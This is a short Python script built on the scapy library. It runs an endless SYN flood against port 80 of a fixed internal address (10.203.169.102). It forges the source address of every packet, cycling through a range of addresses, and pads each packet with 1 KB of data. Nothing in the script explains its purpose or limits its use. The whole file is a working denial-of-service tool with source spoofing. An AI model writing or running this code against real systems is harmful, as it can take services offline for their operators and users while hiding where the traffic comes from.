import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *
from faker import Faker

conf.verb = 0

host = "10.203.169.102"
port = 80

origenIP = "10.203.174."
endIP = 10

packet_number = 0

while True:    
    packet_number += 1 
    packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
    send(packet, inter= 0.0002)  
    print("Packet %d sent" %packet_number)
    endIP += 1 
    if(endIP == 200):
        endIP = 10
